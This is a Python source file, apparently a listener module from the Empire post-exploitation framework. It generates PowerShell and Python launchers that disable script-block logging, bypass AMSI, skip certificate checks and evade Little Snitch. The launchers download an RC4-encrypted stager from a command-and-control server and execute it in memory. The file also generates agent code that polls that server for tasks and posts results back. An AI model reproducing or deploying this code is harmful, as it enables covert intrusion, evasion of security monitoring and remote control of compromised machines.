import base64
import random

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP[S]',

            'Author': ['@harmj0y'],

            'Description': ("Starts a 'foreign' http[s] Empire listener."),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http_foreign'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/http_foreign generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]
            
            if language.startswith('po'):
                # PowerShell

                stager = ''
                if safeChecks.lower() == 'true':
                    # ScriptBlock Logging bypass
                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
                
                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            domain = username.split('\\')[0]
                            usr = username.split('\\')[1]
                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                # TODO: reimplement stager retries?

                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
                        
                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)

                stager += "$ser='%s';$t='%s';" % (host, stage0)
                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python

                launcherBase = 'import sys;'
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                        launcherBase += "out = ps.stdout.read()\n"
                        launcherBase += "ps.stdout.close()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stagger: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]


                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                # add the RC4 packet to a cookie
                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                launcherBase += "import urllib2\n"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(':')[0]
                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                #install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"
                # download the stager and extract the IV
                launcherBase += "a=o.open(server+t).read();"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")

        else:
            print helpers.color("[!] listeners/http_foreign generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        print helpers.color("[!] generate_stager() not implemented for listeners/template")
        return ''


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        print helpers.color("[!] generate_agent() not implemented for listeners/template")
        return ''


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'powershell':
                
                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])
                
                getTask = """
                    function script:Get-Task {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $wc = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $wc = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

                                try{
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket)
        headers['Cookie'] = "session=%s" % (b64routingPacket)

    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""

                return updateServers + sendMessage

            else:
                print helpers.color("[!] listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/http_foreign generate_comms(): no language specified!')


    def start(self, name=''):
        """
        Nothing to actually start for a foreign listner.
        """
        return True


    def shutdown(self, name=''):
        """
        Nothing to actually shut down for a foreign listner.
        """
        pass
